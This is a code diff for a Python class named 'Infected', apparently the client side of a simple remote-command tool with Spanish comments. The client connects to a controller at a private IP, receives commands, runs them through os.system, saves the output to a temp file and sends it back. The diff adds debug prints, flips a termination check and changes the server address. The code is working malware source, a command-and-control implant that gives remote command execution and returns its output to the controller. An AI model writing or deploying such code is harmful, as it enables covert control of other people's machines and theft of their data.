@@ -21,7 +21,8 @@ class Infected:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)            
             # Connect the socket to the port where the server is listening
             server_address = (self.ipServer, self.portReceiveCommand)
-            sock.connect(server_address)            
+            sock.connect(server_address)      
+            print("Conection")      
             try:
                 # Receive action
                 action = self.getDataFromSocket(sock)                
@@ -29,6 +30,7 @@ class Infected:
                 sock.close()
             
             if action != self.lastAction:
+                print("change action!")
                 self.lastAction = action
                 self.executeAction(action)
                 
@@ -38,7 +40,7 @@ class Infected:
     def executeAction(self, action):
         actionAux = action.split(" @ ")
         action = actionAux[0] + " > %tmp%/file.txt"
-        self.isNotFinish = actionAux[1].startswith("T")
+        self.isNotFinish = not actionAux[1].startswith("T")
         print(action)        # porque este print?
         os.system(action)  
         self.sendOutput() # se cambia por output mas adelante
@@ -68,5 +70,5 @@ class Infected:
   
      
     
-inf = Infected("10.12.5.43", 10000, 10001)
+inf = Infected("192.168.1.106", 10000, 10001)
 inf.listenForAction()
